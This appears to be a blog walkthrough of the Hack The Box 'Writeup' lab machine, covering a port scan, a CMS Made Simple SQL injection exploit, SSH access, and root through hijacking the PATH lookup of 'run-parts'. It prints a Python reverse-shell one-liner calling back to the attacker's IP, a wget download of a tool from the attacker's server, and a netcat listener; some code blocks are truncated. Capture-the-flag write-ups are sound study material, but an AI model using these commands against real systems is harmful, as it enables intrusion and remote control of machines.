# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

Always remember to map a domain name to the machine's IP address to ease your rooting !

{% highlight bash %}
$ echo "10.10.10.138 writeup.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sS writeup.htb -p 1-65535 -T4
Nmap scan report for writeup.htb (10.10.10.138)
Host is up (0.25s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 250.07 seconds
{% endhighlight %}

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, lets see if we can gather any information or exploit it ?

Hmm DoS Protection... I guess we cannot simply brute force the directory and pages on this web server. Maybe lets check if they have a `robots.txt` ?

![](/assets/images/writeup2.png)

Alright they do ! And they even have a small robot ascii art on it ! :) Seems like there is also a `writeup` directory so lets try accessing it.

![](/assets/images/writeup3.png)

This looks like a blog containing writeups of different HTB machines ? No wonder the machine is called `writeup`...


# Exploitation

![](/assets/images/writeup4.png)

Checking the source of the page, we find out that the website is using `CMS Made Simple`. Maybe we can find some exploits for it ?

Oh wow there are so many exploits! But which one do we use ? 

After some trial and error, the one that worked for me was `CMS Made Simple < 2.2.10 - SQL Injection`. Using the `--crack` option and specifying `rockyou.txt` as the wordlist,

{% highlight bash %}
$ python  /usr/share/exploitdb/exploits/php/webapps/46635.py -h

Neat ! We got the password for user `jkr`!

If we try to access `ssh` into `jkr`'s account using the credentials we found,

{% highlight bash %}
$ ssh jkr@writeup.htb

# Enumeration

As `jkr`, we need to know what processes are being runned on the machine. To do so, I will be using [pspy](https://github.com/DominicBreuker/pspy). To transfer it from my machine to this machine, I will be using `python`'s `SimpleHTTPServer` module.

On my machine:
{% highlight bash %}
$ mkdir httpserver
$ cd httpserver
$ cp ~/Downloads/pspy64 .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

On the `Writeup` machine:
{% highlight bash %}
jkr@writeup:~$ cd /tmp
jkr@writeup:/tmp$ wget http://10.10.XXX.XXX/pspy64
--2019-08-28 22:59:29--  http://10.10.XXX.XXX/pspy64

jkr@writeup:/tmp$ chmod 777 pspy64
jkr@writeup:/tmp$ ./pspy64
{% endhighlight %}

After monitoring for a while, we see some commands being run as `root`,
{% highlight bash %}
2019/08/28 23:02:25 CMD: UID=0    PID=2313   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/08/28 23:02:25 CMD: UID=0    PID=2314   | run-parts --lsbsysinit /etc/update-motd.d
{% endhighlight %}

For the first command, it is mainly setting the `$PATH` environment variable which determines where the system looks for executables. For the second command, it is running the `run-parts` command.

When I checked where the `run-parts` executable was located,
{% highlight bash %}
jkr@writeup:/tmp$ which run-parts
/bin/run-parts
{% endhighlight %}

`run-parts` was found at `/bin` but `/bin` is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called `run-parts` at `/usr/local/sbin`, the system will execute that instead of the `run-parts` at `/bin`! 

# Privilege Escalation

{% highlight bash %}
jkr@writeup:/tmp$ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
nect((\"10.10.XXX.XXX\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
([\"/bin/sh\",\"-i\"]);'" > /usr/local/sbin/run-parts
jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts
{% endhighlight %}

For the executable, it is a script that contains the command that establishes a reverse shell back to our listener.

{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
{% endhighlight %}

After a long while, I realised that I was not catching any connections from the `Writeup` machine. Is the `run-parts` not getting run ? Lets run `pspy` again to find out why!

{% highlight bash %}

By some chance, I noticed that the 2 commands were being run every time someone has logged in via `ssh`! So lets try this again...

# root.txt

On my machine (listener):
{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
{% endhighlight %}

On the `Writeup` machine:
{% highlight bash %}

([\"/bin/sh\",\"-i\"]);'" > /usr/local/sbin/run-parts
jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts

Again on my machine (on another terminal):
{% highlight bash %}
$ ssh jkr@writeup.htb
jkr@writeup.htb's password:

Rooted ! Thank you for reading and look forward for more writeups and articles !
